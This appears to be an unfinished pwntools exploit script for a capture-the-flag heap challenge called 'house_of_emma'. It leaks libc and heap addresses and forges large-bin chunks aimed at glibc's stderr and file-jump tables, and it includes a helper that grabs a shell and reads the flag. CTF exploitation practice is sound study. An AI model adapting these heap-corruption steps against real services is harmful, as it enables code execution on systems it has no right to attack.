# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './house_of_emma'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))


def cmd(num):
    sa('opcode\n',num)

def add( idx, size):
    cmd('\x01' + p8(idx) + p16(size) + '\x05')

def delete( idx):
    cmd('\x02' + p8(idx) + '\x05')

def show( idx ):
    cmd('\x03' + p8(idx) + '\x05' )

def edit( idx, size , content):
    cmd('\x04' + p8(idx) + p16(size) + content + '\x05')


# one_gad = one_gadget(libc.path)

def attack():

    add( 0 , 0x418)
    add( 1 , 0x418)
    add( 2 , 0x428)
    add( 3 , 0x428)

    delete(2)
    add( 4 , 0x450)
    show(2)

    main_arena_addr = l64()
    __malloc_hook = main_arena_addr - 0x70 - 0x3f0
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    lg('__malloc_hook',__malloc_hook)
    stderr = libc.sym['stderr']
    mp_ = libc.address + 0x1eb280
    IO_str_jumps = libc.address + 0x1e5580
    _IO_file_jumps = libc.sym['_IO_file_jumps']
    setcontext = libc.sym['setcontext']
    mp_ = libc.address  + 0x1e32d0
    _IO_new_file_sync = _IO_file_jumps + 96

    delete(0)

    fake_chunk_large = flat(
        main_arena_addr , main_arena_addr,
        0 , stderr - 0x20
    )

    edit(2 , 0x10 , 'a'*0x10 )
    show(2)
    ru('a'*0x10)
    heap_base = u64(p.recvuntil('\n', drop=True)[-6:].ljust(8, '\x00'))
    lg('heap_base',heap_base)

    edit(2 , len(fake_chunk_large) , fake_chunk_large )
    add( 5 , 0x448 )

    fake_chunk_large = flat(
        main_arena_addr , main_arena_addr,
        0 , _IO_new_file_sync - 0x20,
    )

    edit(2 , len(fake_chunk_large) , fake_chunk_large )
    add(6 , 0x448)



    fake_IO_FILE = flat(
    )
    # _IO_file_jumps

    edit(2 ,len(fake_IO_FILE) , fake_IO_FILE )

    dbg()

    

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   house_of_emma.py
@Time    :   2021/11/14 14:13:16
@Author  :   Niyah 
'''